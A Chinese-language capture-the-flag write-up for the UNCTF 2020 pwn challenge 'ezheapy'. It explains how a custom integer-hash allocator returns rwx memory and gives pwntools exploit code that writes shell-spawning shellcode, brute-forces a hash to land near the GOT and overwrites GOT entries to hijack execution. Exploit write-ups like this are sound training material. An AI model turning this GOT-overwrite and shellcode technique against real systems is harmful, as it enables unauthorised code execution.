
## ezheapy
- 题目描述
- 题目附件：[ezheapy](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/unctf2020/pwn/ezheapy/ezheapy)
- 考察点：整数哈希
- 难度：不会

### 程序分析

比赛时看见是heap就没做，赛后看了看。

作者自己写的`hcalloc`，用的是整数哈希，可分配一片权限是`rwx`的内存，并且可编辑其内容。

### 解题思路

先随便分配一块内存，写入shellcode。再分配一块内存，爆破哈希值到got表附近，由此可编辑got表为shellcode地址。

``` python
def add(sz):
    sla('5. Exit', '1')
    sla('How big is your paste (bytes)?', str(sz))

def edit(idx,data):
    sla('5. Exit', '2')
    sla('What paste would you like to write to?', str(idx))
    sla('Enter your input', data)

add(1024)
edit(0,asm(shellcraft.sh()))

add(0x4a15b) # hash(0x4a15b) == 0x80492eb == gotbase-0xbed
edit(1,'A'*0xbed+p64(0xdde6c400)*20) # hash(1024) == 0xdde6c400
```

> 爆破hash可以不是那么精准，只要能read覆盖到got表即可
>
> 可以忽略后三位进行爆破：

``` python
#!/usr/bin/python3
for i in range(0xffffffff): 
    tmp = (0x9e3779b1*i)&0xffffffff
    print(hex(i),hex(tmp)) 
    if tmp|0xfff == 0x8049ed8|0xfff: 
        input('next?')
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/unctf2020/pwn/ezheapy) 

